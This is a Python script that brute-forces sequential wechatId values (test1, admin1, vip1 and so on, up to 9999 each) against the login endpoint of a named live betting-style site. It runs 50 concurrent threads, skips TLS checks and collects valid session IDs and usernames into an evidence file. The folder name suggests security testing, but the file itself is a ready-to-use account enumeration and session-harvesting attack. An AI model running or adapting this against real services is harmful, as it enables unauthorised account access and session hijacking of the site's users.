#!/usr/bin/env python3
"""
Concurrent wechatId enumeration for bf1788.com.
Tests sequential patterns with high concurrency.
"""
import requests, urllib3, json, sys, time
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings()

url = "https://apib63.bf1788.com/boxApi.php"
base = {"vendorId": "test", "signature": "test", "site": "bfc", "lang": "tw"}

found_accounts = []

def try_login(wechat_id):
    try:
        resp = requests.post(
            f"{url}?cmd=1000",
            data={"cmd": "1000", "wechatId": wechat_id, "sid": "", **base},
            timeout=15, verify=False
        )
        data = resp.json()
        if data.get("status") == "0" and "msg" in data:
            msg = data["msg"]
            if isinstance(msg, dict) and "sid" in msg:
                return (wechat_id, msg["sid"], msg.get("username", ""))
    except:
        pass
    return None

# Generate candidates
patterns = [
    "testwechat{}",
    "test{}",
    "wechat{}",
    "user{}",
    "admin{}",
    "player{}",
    "member{}",
    "vip{}",
    "guest{}",
    "bf{}",
    "bfc{}",
    "user_{}",
    "test_{}"
]

candidates = []
for pattern in patterns:
    for i in range(1, 10000):
        candidates.append(pattern.format(i))

print(f"[*] Testing {len(candidates)} candidates with concurrency=50...")

with ThreadPoolExecutor(max_workers=50) as executor:
    futures = {executor.submit(try_login, wid): wid for wid in candidates}
    done = 0
    for future in as_completed(futures):
        result = future.result()
        done += 1
        if result:
            wid, sid, username = result
            found_accounts.append({"wechatId": wid, "sid": sid, "username": username})
            print(f"[+] FOUND: {wid} -> sid={sid[:8]}..., username={username}")
        if done % 1000 == 0:
            print(f"  Progress: {done}/{len(candidates)}, found: {len(found_accounts)}", flush=True)

# Also test known test account
result = try_login("testwechat001")
if result:
    found_accounts.append({"wechatId": "testwechat001", "sid": result[1], "username": result[2]})
    print(f"[+] FOUND: testwechat001 -> sid={result[1][:8]}..., username={result[2]}")

# Save results
output = {
    "total_tested": len(candidates) + 1,
    "accounts_found": len(found_accounts),
    "found": found_accounts,
}
with open("/mnt/c/Users/Administrator/Desktop/JySecAI/evidence/bf1788-wechatlogin-20260915/enumeration_results.json", "w") as f:
    json.dump(output, f, indent=2, ensure_ascii=False)

print(f"\n[+] Found {len(found_accounts)} accounts out of {len(candidates)} tested")
print(f"[+] Results saved to enumeration_results.json")